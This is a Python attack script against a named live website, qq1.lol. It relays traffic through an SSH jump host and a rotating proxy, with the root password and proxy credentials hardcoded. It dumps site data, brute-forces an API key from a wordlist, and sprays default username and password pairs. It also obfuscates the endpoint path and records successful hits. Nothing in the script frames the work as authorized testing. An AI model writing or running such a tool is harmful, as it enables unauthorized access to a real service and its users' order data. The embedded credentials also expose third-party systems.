#!/usr/bin/env python3
"""qq1.lol recheck4 — siteinfo dump, tools API key brute, user/pass API auth, notify"""
import json
import re
import shlex
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path("/workspace/results/qq1.lol")
LOG = OUT / "recheck4.log"
HITS = OUT / "recheck_hits.jsonl"
QG_KEY, QG_PWD = "C413ED6D", "344F550A6F8B"
JP_PASS, JP_HOST = "DX4LmrDaPfd9", "42.240.167.114"
JAR = "/tmp/qq1_recheck4.jar"
_px = None

KEYS = [
    "qq1", "buyi", "buyiq", "qqkqq", "830603", "faka", "123456", "admin", "888888", "666666",
    "qq1.lol", "buyi123", "buyi888", "buyi666", "buyi2024", "buyi2025", "buyi2026", "布衣",
    "QQKZC", "qqkzc", "rainbow", "mckuai", "epay", "syskey", "secret", "password", "root",
    "abcdef", "ka1.one", "ka1", "kln166", "fffzz", "hmjf", "htqq", "apikey", "api_key",
    "token", "key", "merchant", "paykey", "authkey", "jiankong", "cron", "Lxsj@123",
    "ruoyi123", "tianyu9080", "qq1admin", "qq1key", "qq1api", "buyiq123", "自动发卡", "发卡",
    "qq0", "q8", "kawei1", "fc86d2e2", "对接", "对接密钥", "123456789", "111111", "000000",
]


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    with open(HITS, "a") as f:
        f.write(json.dumps({"kind": kind, "detail": detail, "body": (body or "")[:8000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:350]}")


def ssh(script, timeout=50):
    return subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", script],
        capture_output=True, text=True, timeout=timeout,
    ).stdout or ""


def proxy(force=False):
    global _px
    if _px and not force:
        return _px
    d = json.loads(ssh(f"curl -s 'https://share.proxy.qg.net/get?key={QG_KEY}&num=1'", 20))
    _px = f"http://{QG_KEY}:{QG_PWD}@{d['data'][0]['server']}"
    log(f"proxy {_px.split('@')[1]}")
    return _px


def curl(url, post=None, mt=22, force_px=False):
    px = proxy(force_px)
    hdr = "-H 'Referer: https://qq1.lol/' -H 'X-Requested-With: XMLHttpRequest'"
    pp = f"-X POST -H 'Content-Type: application/x-www-form-urlencoded' -d {shlex.quote(post)}" if post is not None else ""
    script = (
        f"curl -sk --max-time {mt} -x {shlex.quote(px)} -b {JAR} -c {JAR} -A 'Mozilla/5.0' "
        f"{hdr} {pp} -w '\\n__HTTP:%{{http_code}}' {shlex.quote(url)}"
    )
    out = ssh(script, mt + 25)
    if "__HTTP:" not in out:
        return out.strip(), "000"
    body, code = out.rsplit("__HTTP:", 1)
    return body.strip(), code.strip()


def main():
    log("=== RECHECK4 START ===")
    ssh(f"rm -f {JAR}")
    proxy(True)

    # 1) full siteinfo dump
    log("=== [1] siteinfo (no key) ===")
    body, code = curl(f"{BASE}/%61pi.php?act=siteinfo")
    log(f"siteinfo HTTP={code} len={len(body)}")
    (OUT / "siteinfo.json").write_text(body or "")
    if body and "sitename" in body:
        hit("siteinfo", "no-key", body)
        try:
            info = json.loads(body)
            for k in ("sitename", "kfqq", "anounce", "modal", "bottom", "alert", "gg_search", "gg_panel", "appalert", "version", "build"):
                if info.get(k):
                    log(f"  {k}: {str(info[k])[:200]}")
        except Exception as e:
            log(f"  parse err {e}")

    # 2) classlist full
    body, _ = curl(f"{BASE}/%61pi.php?act=classlist")
    (OUT / "classlist.json").write_text(body or "")
    log(f"classlist len={len(body)}")

    # 3) tools API key brute (correct endpoint!)
    log("=== [2] tools API key brute ===")
    found = None
    for key in KEYS:
        body, code = curl(f"{BASE}/%61pi.php?act=tools&key={quote(key)}&limit=5")
        if not body or "_guard" in body:
            time.sleep(0.3)
            continue
        if "密钥错误" in body or "请提供" in body or "No Act" in body:
            continue
        # success: returns JSON array of tools
        if body.startswith("[") or ('"tid"' in body and "密钥" not in body):
            hit("api_key_tools", key, body)
            found = key
            (OUT / "API_KEY.txt").write_text(key)
            break
        if '"code":0' in body or '"code":1' in body:
            hit("api_key_tools_code", key, body)
            found = key
            break
        log(f"  unexpected key={key!r}: {body[:100]}")
        time.sleep(0.25)

    if found:
        log(f"=== dump with key={found} ===")
        for act in ("tools", "orders", "search", "change"):
            body, _ = curl(f"{BASE}/%61pi.php?act={act}&key={quote(found)}&limit=20&tid=102&id=25949&zt=1")
            hit("api_dump", act, body)

    # 4) orders/search with user+pass (from goodslistbycid pattern)
    log("=== [3] API user/pass auth ===")
    creds = [
        ("admin", "admin"), ("admin", "123456"), ("admin", "admin888"), ("admin", "buyi"),
        ("buyi", "buyi"), ("buyi", "123456"), ("buyi", "buyi123"), ("buyi", "buyi888"),
        ("qq1", "qq1"), ("qq1", "123456"), ("qqkqq", "123456"),
    ]
    for user, pwd in creds:
        for act in ("orders", "search", "goodslistbycid"):
            body, code = curl(
                f"{BASE}/%61pi.php?act={act}&id=25949&limit=5&tid=102&cid=4",
                post=f"user={quote(user)}&pass={quote(pwd)}&cid=4",
            )
            if body and "请提供" not in body and "不正确" not in body and "密钥" not in body and "_guard" not in body:
                if len(body) > 20:
                    hit("api_userpass", f"{act} {user}:{pwd}", body)
            elif body and "封禁" in body:
                hit("api_user_exists", f"{user}", body)
            time.sleep(0.4)

    # 5) more keyless acts
    log("=== [4] more keyless acts ===")
    for act in ("siteinfo", "classlist", "goodslist", "goods", "gettool", "getcount", "pay", "buy"):
        body, code = curl(f"{BASE}/%61pi.php?act={act}")
        if body and "No Act" not in body and "请提供" not in body and "_guard" not in body and len(body) > 30:
            log(f"  {act}: {body[:150]}")
            if act not in ("siteinfo", "classlist"):
                hit("keyless_act", act, body)
        time.sleep(0.5)

    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== RECHECK4 DONE hits={n} ===")


if __name__ == "__main__":
    main()
